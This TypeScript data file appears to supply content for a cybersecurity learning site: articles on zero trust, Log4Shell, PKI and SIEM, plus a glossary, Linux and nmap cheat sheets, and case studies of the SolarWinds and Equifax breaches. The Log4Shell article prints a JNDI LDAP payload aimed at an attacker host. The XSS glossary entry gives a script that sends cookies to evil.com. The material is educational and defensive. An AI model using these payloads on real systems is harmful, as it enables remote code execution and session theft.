import { Article, CheatSheet, GlossaryTerm, IncidentCaseStudy } from '../types';

export const knowledgeArticles: Article[] = [
  {
    id: 'art-1',
    title: 'Zero Trust Architecture: Moving Beyond the Castle-and-Moat Security Model',
    category: 'Architecture',
    difficulty: 'Intermediate',
    readTime: '6 min read',
    author: 'Elena Vance, Principal Security Architect',
    date: 'Oct 20, 2026',
    summary: 'Why traditional network perimeter boundaries fail against modern adversaries and how "never trust, always verify" redefines enterprise defense.',
    content: [
      'For decades, corporate IT relied on the "castle-and-moat" paradigm: once a device or user passed through the perimeter firewall or VPN, they were implicitly trusted across the internal local area network.',
      'Modern attack surfaces—spurred by hybrid cloud, mobile devices, and SaaS services—have rendered perimeter trust obsolete. Once an attacker obtains a single employee workstation through phishing, they pivot laterally with impunity.',
      'Zero Trust Architecture (ZTA), codified in NIST Special Publication 800-207, operates on three non-negotiable tenets: verify explicitly, enforce least-privilege access, and assume breach.',
      'Every access request—regardless of origin within or outside the corporate intranet—must be authenticated, authorized, and cryptographically encrypted based on dynamic continuous risk signals (device health, geolocation, user behavior).'
    ]
  },
  {
    id: 'art-2',
    title: 'Deconstructing the Log4Shell (CVE-2021-44228) Zero-Day Anatomy',
    category: 'Vulnerability Analysis',
    difficulty: 'Advanced',
    readTime: '8 min read',
    author: 'Marcus Chen, Threat Researcher',
    date: 'Oct 14, 2026',
    summary: 'A deep-dive technical post-mortem into how an obscure JNDI lookup feature in Apache Log4j resulted in remote code execution worldwide.',
    content: [
      'In December 2021, a catastrophic vulnerability was disclosed in Apache Log4j 2, a ubiquitous Java logging library embedded in millions of enterprise services and enterprise IoT devices.',
      'The root cause stemmed from JNDI (Java Naming and Directory Interface) message lookups enabled by default. When an application logged untrusted strings containing `${jndi:ldap://attacker.com/exploit}`, Log4j automatically initiated an outbound network connection to the attacker LDAP server and executed remote Java class bytecode.',
      'Attackers exploited this simply by pasting the payload string into HTTP User-Agent headers, chat message boxes, search fields, or Minecraft game chat—wherever strings were logged.',
      'Remediation required upgrading to Log4j 2.17.1+, disabling JNDI lookups via system flags, implementing strict egress network filtering to block LDAP/RMI outbound connections, and establishing comprehensive software bills of materials (SBOMs).'
    ]
  },
  {
    id: 'art-3',
    title: 'Demystifying Public Key Infrastructure (PKI) and SSL/TLS Certificates',
    category: 'Cryptography',
    difficulty: 'Beginner',
    readTime: '5 min read',
    author: 'Dr. Sarah Lin, Cryptographer',
    date: 'Oct 02, 2026',
    summary: 'How asymmetric key pairs, Certificate Authorities, and X.509 standards protect billions of web transactions daily.',
    content: [
      'When your browser displays a padlock icon next to an HTTPS web address, an intricate dance of cryptographic standards occurs within milliseconds.',
      'Public Key Infrastructure (PKI) solves the fundamental problem of key distribution over insecure channels. It utilizes asymmetric cryptography: a public key that can be distributed to anyone, and a mathematically paired private key held exclusively by the server.',
      'To prevent an attacker in the middle from substituting their own public key, trusted third parties known as Certificate Authorities (CAs) digitally sign the server certificate.',
      'Operating systems and browsers maintain a curated store of Root CA certificates. By validating the cryptographic signature chain back to a trusted root, clients verify the authenticity of the remote server.'
    ]
  },
  {
    id: 'art-4',
    title: 'The Fundamentals of Security Information and Event Management (SIEM)',
    category: 'Operations',
    difficulty: 'Beginner',
    readTime: '5 min read',
    author: 'David Okonjo, Lead SOC Analyst',
    date: 'Sep 24, 2026',
    summary: 'How modern Security Operations Centers ingest millions of log events to detect intrusions in real time.',
    content: [
      'A typical enterprise network generates hundreds of gigabytes of log entries every day across domain controllers, firewalls, endpoint sensors, and cloud services.',
      'A SIEM platform (such as Splunk, Elastic Security, or Microsoft Sentinel) aggregates these heterogeneous log formats into a normalized schema, indexes them for high-speed queries, and correlates multi-stage event sequences.',
      'For example, a failed login by itself is mundane. But 50 failed logins in 60 seconds followed immediately by a successful login and an outbound data transfer to an unknown external IP triggers an automated high-severity alert.'
    ]
  }
];

export const glossaryTerms: GlossaryTerm[] = [
  {
    term: 'CIA Triad',
    acronym: 'CIA',
    category: 'Fundamentals',
    definition: 'The benchmark model for information security policies consisting of Confidentiality, Integrity, and Availability.',
    example: 'Encrypting files protects Confidentiality; calculating SHA-256 hashes ensures Integrity; deploying load balancers maintains Availability.'
  },
  {
    term: 'Zero-Day Vulnerability',
    acronym: '0-Day',
    category: 'Vulnerabilities',
    definition: 'A software flaw that is known to attackers or researchers but has zero days of patch availability from the vendor.',
    example: 'Before a patch was published for Log4j, threat actors exploited the zero-day to compromise servers without existing vendor fixes.'
  },
  {
    term: 'Man-in-the-Middle',
    acronym: 'MitM',
    category: 'Network Attacks',
    definition: 'An attack where the adversary secretly relays and possibly alters communications between two parties who believe they are directly communicating.',
    example: 'ARP poisoning on an untrusted public Wi-Fi network allows an attacker to intercept unencrypted cleartext HTTP traffic.'
  },
  {
    term: 'Cross-Site Scripting',
    acronym: 'XSS',
    category: 'Web Security',
    definition: 'A web vulnerability where malicious executable JavaScript is injected into trusted websites and executed within victim browsers.',
    example: 'An unsanitized comment section allows an attacker to post `<script>fetch("evil.com/?c=" + document.cookie)</script>`.'
  },
  {
    term: 'Indicator of Compromise',
    acronym: 'IOC',
    category: 'Threat Intelligence',
    definition: 'Forensic evidence of potential intrusion on a host or network, such as specific file hashes, malicious IP addresses, or registry keys.',
    example: 'The SOC added the C2 domain `evil-command.xyz` to the network blocklist as a confirmed IOC.'
  },
  {
    term: 'Defense-in-Depth',
    category: 'Architecture',
    definition: 'A cybersecurity strategy deploying multiple independent layers of security controls throughout an information technology system.',
    example: 'A company implements endpoint antivirus, network firewalls, multi-factor authentication, and data loss prevention.'
  },
  {
    term: 'Honeypot',
    category: 'Defensive Deception',
    definition: 'A decoy system or server deployed intentionally to attract, detect, and deflect unauthorized use of information systems.',
    example: 'Deploying an intentionally vulnerable SSH server on port 2222 to capture attacker IP addresses and passwords.'
  },
  {
    term: 'Principle of Least Privilege',
    acronym: 'PoLP',
    category: 'Access Control',
    definition: 'The concept that a user, program, or process must be granted only the minimum permissions necessary to complete its essential function.',
    example: 'A web server application runs under a dedicated `www-data` service account without sudo or root privileges.'
  }
];

export const cheatSheets: CheatSheet[] = [
  {
    id: 'cs-linux',
    title: 'Essential Linux Security & Sysadmin Commands',
    description: 'Everyday command-line tools for inspecting permissions, users, network sockets, and system processes.',
    sections: [
      {
        title: 'Permissions & Ownership',
        commands: [
          { cmd: 'chmod 755 filename', desc: 'Set rwxr-xr-x (Owner: read/write/exec, Others: read/exec)' },
          { cmd: 'chmod 600 id_rsa', desc: 'Secure SSH private key (Owner read/write only)' },
          { cmd: 'chown user:group file', desc: 'Change owner and primary group of a file' },
          { cmd: 'find / -perm -4000 2>/dev/null', desc: 'Locate all files with SUID bit enabled (potential privilege escalation)' }
        ]
      },
      {
        title: 'Network & Port Inspection',
        commands: [
          { cmd: 'ss -tulpn', desc: 'Display all listening TCP and UDP sockets with process names and PIDs' },
          { cmd: 'ip a', desc: 'Show assigned IP addresses and network interfaces' },
          { cmd: 'iptables -L -v -n', desc: 'List active firewall packet filtering rules with packet counters' }
        ]
      },
      {
        title: 'Processes & Activity',
        commands: [
          { cmd: 'ps aux | grep -i suspicious', desc: 'Search running processes across all users' },
          { cmd: 'tail -f /var/log/auth.log', desc: 'Live monitor authentication attempts on Debian/Ubuntu' },
          { cmd: 'last -F -n 10', desc: 'Display last 10 login sessions with full timestamps' }
        ]
      }
    ]
  },
  {
    id: 'cs-nmap',
    title: 'Nmap Network Scanning Flags',
    description: 'Frequently used flags for authorized port scanning, version detection, and host discovery.',
    sections: [
      {
        title: 'Scan Techniques',
        commands: [
          { cmd: 'nmap -sS target', desc: 'SYN Half-Open Stealth Scan (fast and default privileged scan)' },
          { cmd: 'nmap -sT target', desc: 'TCP Full Connect Scan (used when unprivileged / raw sockets unavailable)' },
          { cmd: 'nmap -sU target', desc: 'UDP Port Scan (checks common services like DNS, DHCP, SNMP)' },
          { cmd: 'nmap -sn 192.168.1.0/24', desc: 'Ping Sweep / Host discovery without port scanning' }
        ]
      },
      {
        title: 'Enumeration & Scripts',
        commands: [
          { cmd: 'nmap -sV target', desc: 'Probe open ports to determine service name and software version info' },
          { cmd: 'nmap -O target', desc: 'Enable remote Operating System detection via TCP/IP fingerprinting' },
          { cmd: 'nmap -sC target', desc: 'Run default safe NSE (Nmap Scripting Engine) scripts' },
          { cmd: 'nmap -p 1-65535 -T4 target', desc: 'Scan all 65,535 TCP ports with aggressive timing template' }
        ]
      }
    ]
  },
  {
    id: 'cs-ports',
    title: 'Critical Network Ports & Default Services',
    description: 'Reference sheet of standard IANA port allocations commonly encountered in cybersecurity.',
    sections: [
      {
        title: 'Core Administrative & Web Ports',
        commands: [
          { cmd: 'Port 22 (TCP)', desc: 'SSH (Secure Shell) / SFTP' },
          { cmd: 'Port 23 (TCP)', desc: 'Telnet (Cleartext unencrypted remote login - legacy)' },
          { cmd: 'Port 53 (TCP/UDP)', desc: 'DNS (Domain Name System)' },
          { cmd: 'Port 80 (TCP)', desc: 'HTTP (Hypertext Transfer Protocol cleartext)' },
          { cmd: 'Port 443 (TCP)', desc: 'HTTPS (HTTP over TLS/SSL encrypted)' },
          { cmd: 'Port 3389 (TCP)', desc: 'RDP (Microsoft Remote Desktop Protocol)' },
          { cmd: 'Port 445 (TCP)', desc: 'SMB (Server Message Block - Windows file sharing)' }
        ]
      }
    ]
  }
];

export const incidentCaseStudies: IncidentCaseStudy[] = [
  {
    id: 'case-solarwinds',
    title: 'SolarWinds SUNBURST Supply Chain Compromise',
    year: 2020,
    targetOrganization: 'SolarWinds Orion Software & Thousands of Enterprise Customers',
    attackVector: 'Software Supply Chain Poisoning',
    impactSummary: 'Over 18,000 global organizations downloaded a weaponized software update. Attackers gained deep espionage access into US government departments, cybersecurity firms, and Fortune 500 networks.',
    rootCause: 'State-sponsored threat actors compromised the internal build pipeline of SolarWinds and injected a sophisticated backdoor (SUNBURST / Solorigate) into legitimate Orion platform DLL updates signed with valid corporate certificates.',
    timeline: [
      { date: 'Sep 2019', event: 'Threat actors establish initial access to SolarWinds build environment.' },
      { date: 'Feb 2020', event: 'Compromised compiler injects malicious backdoor into Orion update release.' },
      { date: 'Mar 2020', event: 'Trojanized update digitally signed and pushed to thousands of customer systems.' },
      { date: 'Dec 2020', event: 'FireEye discovers unauthorized access on its network and alerts SolarWinds and the cybersecurity community.' }
    ],
    defensiveTakeaways: [
      'Implement multi-party cryptographic verification and reproducible build pipelines.',
      'Enforce strict egress filtering: even trusted internal servers should not have unrestricted outbound internet access to arbitrary domains.',
      'Adopt zero trust principles: software agents inside your datacenter must be treated as potential threat vectors.'
    ]
  },
  {
    id: 'case-equifax',
    title: 'The Equifax Apache Struts Data Breach',
    year: 2017,
    targetOrganization: 'Equifax Credit Reporting Bureau',
    attackVector: 'Unpatched Known Vulnerability (CVE-2017-5638 in Apache Struts)',
    impactSummary: 'Compromise of sensitive personal data (Social Security numbers, birth dates, driver licenses) belonging to over 147 million consumers, resulting in hundreds of millions in penalties.',
    rootCause: 'Apache disclosed CVE-2017-5638 in early March 2017 and provided a security patch. Equifax internal security alerted system administrators to patch, but due to incomplete asset inventories, the online dispute portal server remained unpatched for over two months.',
    timeline: [
      { date: 'Mar 07, 2017', event: 'Apache releases security advisory and patch for CVE-2017-5638.' },
      { date: 'Mar 10, 2017', event: 'Attackers begin automated internet-wide scanning and compromise Equifax server.' },
      { date: 'May-Jul 2017', event: 'Adversaries run queries across 48 databases, extracting credentials and personal data.' },
      { date: 'Jul 29, 2017', event: 'Security personnel detect suspicious network traffic after renewing an expired SSL certificate on network inspection tools.' }
    ],
    defensiveTakeaways: [
      'Maintain an exhaustive, continuously updated software and hardware asset inventory.',
      'Accelerate vulnerability patch management SLAs for internet-exposed systems.',
      'Segment database tiers so web servers cannot query arbitrary internal databases without strict access limits.'
    ]
  }
];

export const cyberNewsItems = [
  {
    id: 'news-1',
    date: 'Oct 27, 2026',
    category: 'Threat Intel',
    headline: 'Critical Vulnerability in Core Open-Source TLS Stack Patched',
    summary: 'Maintainers released an emergency update addressing a memory corruption boundary error in handshake processing. Defense teams are urged to apply mitigations.',
    source: 'CyberSphere Threat Research Desk'
  },
  {
    id: 'news-2',
    date: 'Oct 25, 2026',
    category: 'Advisory',
    headline: 'CISA Issues Binding Directive on Cloud IAM Service Account Hygiene',
    summary: 'New government guidance mandates automated rotation of long-lived API tokens and removal of excessive administrator privileges across public cloud tenants.',
    source: 'Government Security Bulletin'
  },
  {
    id: 'news-3',
    date: 'Oct 22, 2026',
    category: 'Malware Analysis',
    headline: 'New Infostealer Strain Uses Legitimate Remote Monitoring Tools for Egress',
    summary: 'Defenders observed adversary groups abusing signed remote monitoring utilities (RMM) to blend malicious data exfiltration with normal IT traffic.',
    source: 'Threat Horizon Report'
  }
];
